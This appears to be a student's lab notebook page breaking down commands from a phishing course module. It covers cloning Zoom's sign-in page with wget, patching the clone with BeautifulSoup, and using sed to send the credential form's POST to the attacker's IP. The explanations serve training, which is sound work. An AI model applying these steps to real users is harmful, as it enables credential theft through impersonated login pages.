# Phishing, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Website cloning and credential-capture mechanics from [[11. Phishing Basics|Phishing Basics]]. See that page for the entry format.

---

## Why `wget` alone can't clone a modern login page

**Full command (the one that fails):**
```bash
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
```
followed by serving it locally and getting an **OWASP CSRFGuard error**: "JavaScript was included from within an unauthorized domain!"

**Piece by piece:**
- `wget` fundamentally just downloads bytes, it has no JavaScript engine, no DOM, no rendering pipeline. It fetches the raw HTML document and whatever `.js`/`.css` files that HTML references, but it never *executes* any of that JavaScript.
- Modern single-page apps (Zoom's login page included) render most of their actual interactive content, and their security controls, via JavaScript that runs client-side after the initial HTML loads. `wget` captures the HTML shell but misses everything the JS would have built on top of it.
- The specific error here comes from Zoom's own CSRF-protection JavaScript checking what domain it's running on. Since we're serving the cloned files from `127.0.0.1` instead of `zoom.us`, that check fails and the script refuses to run, which breaks the page's own interactive elements as a side effect.
- This isn't a `wget` misconfiguration to fix with different flags, it's a fundamental capability gap: `wget` cannot execute JavaScript, full stop. Any page whose functionality depends on JS running (which is most modern login flows) needs a tool that actually renders the page in a real browser engine.

**Where this comes from:** this is general web-fundamentals knowledge (static HTTP client vs. browser rendering engine), not a specific exploit technique. Worth recognizing the symptom (page looks static/broken, JS-dependent elements don't work, console shows script errors about domain/origin) as the signal to reach for a headless-browser-based tool instead.

**Where to look in the response:** open the browser's console (F12) on the locally-served clone, the actual JS error (CSRFGuard's specific complaint here) will be sitting right there, that's the fastest way to confirm "the JS didn't run" versus assuming the clone itself is broken.

🔁 **Seen in:** [[11. Phishing Basics#11.3.2. Cloning a Legitimate Website|Phishing Basics, 11.3.2]].

#### Tags: #Phishing #Wget #WebsiteCloning #CommandBreakdowns

---

## BeautifulSoup's attribute API vs. raw string-replace for patching a clone

**The fragile version (what broke):**
```python
html = html.replace('id="signin_btn_next"', 'id="signin_btn_next" onclick="goToPassword()"')
```
**The robust version (what actually worked):**
```python
from bs4 import BeautifulSoup
soup = BeautifulSoup(html, "html.parser")
next_btn = soup.find(id="signin_btn_next")
if next_btn:
    next_btn['onclick'] = 'goToPassword()'
```

**Piece by piece:**
- `html.replace('id="signin_btn_next"'...)` → this only works if the *exact* substring `id="signin_btn_next"` (quotes included, in that exact position relative to other attributes) appears in the file. HTML doesn't actually require quotes around attribute values without spaces (`id=foo` and `id="foo"` are both valid, equivalent HTML), and attribute order is never semantically meaningful. A tool like SingleFile CLI can legally emit either form, and a reference walkthrough showing one form doesn't guarantee your own capture produced the same one.
- When the string-replace's target doesn't match anything, `.replace()` in Python **doesn't error**, it just returns the original string unchanged. The script runs to completion, prints "Done," and looks successful, while having silently done nothing. This is the dangerous part: a failure with no error signal.
- `soup.find(id="signin_btn_next")` → BeautifulSoup parses the HTML into an actual DOM tree first (via `html.parser` here), and DOM lookups by attribute value don't care how that attribute was originally written (quoted, unquoted, single-quoted, whatever order relative to siblings). `.find(id=...)` matches on the *parsed value*, not the *literal source text*.
- `next_btn['onclick'] = 'goToPassword()'` → once you have the actual tag object, setting an attribute is a dictionary-style assignment, BeautifulSoup handles serializing it back out correctly regardless of how the original attribute looked.
- The general principle: **prefer a structured parser's API over raw text manipulation whenever you're modifying HTML/XML/JSON**, text manipulation is only really safe when you're 100% certain of the exact byte-for-byte source format, which you rarely are when the source came from a tool (SingleFile, `wget`, a browser's "Save As") rather than something you wrote yourself.

**Where this comes from:** general software engineering practice (parse, don't pattern-match, when the format has a real grammar), not a specific security reference. BeautifulSoup's own docs (`crummy.com/software/BeautifulSoup/bs4/doc/`) cover the `.find()`/attribute-access API in the "Navigating the tree" and "Modifying the tree" sections.

**Where to look in the response:** add explicit success/failure prints around every `.find()` call during development (`if elem: print("found") else: print("WARNING: not found")`), exactly like the pattern used in [[11. Phishing Basics#11.3.3. Cleaning Up the Clone|11.3.3]]'s script. A silent `.replace()` failure gives you no such signal, an explicit `.find()` check does.

🔁 **Seen in:** [[11. Phishing Basics#11.3.3. Cleaning Up the Clone|Phishing Basics, 11.3.3]].

#### Tags: #Phishing #BeautifulSoup #Python #DebuggingMethodology #CommandBreakdowns

---

## Why 127.0.0.1 breaks once a real victim machine is involved

**The command that needed fixing:**
```bash
grep -n "127.0.0.1:8080" ~/ZoomSignin/signin.html
sed -i 's|127.0.0.1:8080|192.168.45.212:8080|' ~/ZoomSignin/signin.html
```

**Piece by piece:**
- `127.0.0.1` (loopback/localhost) is a special address that always means **"this same machine"**, no matter which machine is asking. It's not a real network address that routes anywhere, every computer's own `127.0.0.1` points at itself and only itself.
- When the cloned page's password form has `action="http://127.0.0.1:8080/creds"`, that URL gets interpreted by *whichever browser loads the page*. Testing on the attacker's own Kali box, that's the attacker's own machine, so it correctly reaches the credential server also running there. Once a victim on a different machine opens the same page, their browser resolves `127.0.0.1` to **their own machine**, not the attacker's, and the POST goes nowhere useful (or fails outright, since nothing's listening on the victim's own port 8080).
- The fix is mechanical: replace every `127.0.0.1` reference meant to reach the attacker's infrastructure with the attacker's actual routable IP (here, the Kali box's VPN/`tun0` address, since that's what's reachable from the lab network).
- `grep` before `sed`: confirmed there was exactly one occurrence of the string before blindly replacing it, avoiding an unscoped find-replace touching something unintended (same discipline as checking `git diff --stat` after a bulk edit elsewhere in this vault, verify the blast radius before and after, not just after).

**Where this comes from:** general networking fundamentals (loopback addresses are host-local by definition, RFC 5735 for the technical definition), not phishing-specific, but it's an extremely common practical trap in any exploit-development or payload-delivery workflow, "works on localhost, breaks in the real world" is one of the most common classes of bug in security tooling generally. The module's own text explicitly calls this out as a tip for real engagements, worth treating as a checklist item (search your payload for `127.0.0.1` before delivering it) rather than something to remember case by case.

**Where to look in the response:** if a credential-capture (or any callback) listener stays silent even though the target definitely interacted with the payload, check the payload itself for hardcoded loopback addresses before assuming the listener, firewall, or network path is the problem.

🔁 **Seen in:** [[11. Phishing Basics#11.3.5. Crafting the Phishing Email|Phishing Basics, 11.3.5]], Step 1.

#### Tags: #Phishing #Networking #Loopback #CommandBreakdowns

---

## **Outstanding**
- [ ] MFA-aware capture page mechanics, GoPhish/Evilginx2 internals, once covered.
